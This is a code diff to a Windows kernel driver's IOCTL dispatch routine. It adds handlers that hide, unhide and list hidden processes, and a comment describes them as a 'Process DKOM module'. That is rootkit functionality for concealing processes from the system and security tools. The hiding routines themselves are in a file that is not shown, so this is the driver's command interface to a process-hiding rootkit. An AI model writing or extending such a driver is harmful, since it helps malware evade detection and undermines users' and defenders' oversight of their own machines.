@@ -1,5 +1,5 @@
 #include "Dispatch.h"
-#include "FishyFunctions.h"
+#include "ProcessModule.h"
 #include "Shared.h"
 #include <ntddk.h>
 
@@ -81,9 +81,40 @@ NTSTATUS DispatchDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
     }
     break;
 
-    // ------------------------------------------------------
-    // TODO: Fishy call here
-    // ------------------------------------------------------
+  // ------------------------------------------------------
+  // Process DKOM module (see ProcessModule.c)
+  // ------------------------------------------------------
+  case IOCTL_HIDE_PROCESS:
+    DbgPrint("HIDE_PROCESS requested.\n");
+    if (inputLength == sizeof(PROCESS_REQUEST)) {
+      PPROCESS_REQUEST req = (PPROCESS_REQUEST)inputBuffer;
+      status = ProcessHide(req->ProcessId);
+      bytesReturned = 0;
+    } else {
+      status = STATUS_INVALID_BUFFER_SIZE;
+    }
+    break;
+
+  case IOCTL_UNHIDE_PROCESS:
+    DbgPrint("UNHIDE_PROCESS requested.\n");
+    if (inputLength == sizeof(PROCESS_REQUEST)) {
+      PPROCESS_REQUEST req = (PPROCESS_REQUEST)inputBuffer;
+      status = ProcessUnhide(req->ProcessId);
+      bytesReturned = 0;
+    } else {
+      status = STATUS_INVALID_BUFFER_SIZE;
+    }
+    break;
+
+  case IOCTL_LIST_HIDDEN_PROCESSES:
+    DbgPrint("LIST_HIDDEN_PROCESSES requested.\n");
+    if (outputLength == sizeof(PROCESS_LIST_RESPONSE)) {
+      status = ProcessListHidden((PPROCESS_LIST_RESPONSE)outputBuffer);
+      bytesReturned = sizeof(PROCESS_LIST_RESPONSE);
+    } else {
+      status = STATUS_INVALID_BUFFER_SIZE;
+    }
+    break;
 
   default:
     DbgPrint("Unknown IOCTL: 0x%X\n", ioctlCode);
